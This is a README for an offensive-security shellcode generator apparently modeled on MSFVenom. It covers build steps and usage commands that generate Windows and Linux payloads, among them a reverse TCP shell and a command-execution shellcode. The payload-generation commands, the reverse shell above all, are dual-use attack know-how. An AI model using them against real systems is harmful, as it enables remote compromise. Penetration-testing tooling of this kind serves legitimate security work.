# Shcgen

A shellcode generator written in Zig, inspired by MSFVenom.  

## Install

Download from [releases](/releases) page.

## Build

We can also use build & use it from source.  
It's required that you've already installed `zig` in your system.

```sh
git clone https://github.com/hideckies/shcgen
cd shcgen
zig build --release=small
./zig-out/bin/shcgen --help
```

## Prerequisites

Before using `shcgen`, you need to have the following installed:

- `nasm`

To install them, run the following:

```sh
# Debian/Ubuntu
sudp apt install nasm

# CentOS/Fedora
sudo yum install nasm

# macOS
brew install nasm
```

For Windows, download from [NASM official release page](https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D).

## How To Use

### Generate Windows Payloads

```sh
# Example 1. Execute arbitrary command
shcgen -p windows/x64/exec --cmd calc -f raw -o /tmp/shellcode.bin

# Example 2. Reverse Shell
shcgen -p windows/x64/shell_reverse_tcp --lhost 127.0.0.1 --lport 4444 -f raw -o /tmp/shellcode.bin
```

### Generate Linux Payloads

```sh
# Example 1. Execute arbitrary command
shcgen -p linux/x64/exec --cmd /bin/sh -f hex
```

See [examples](/examples/) for more details.


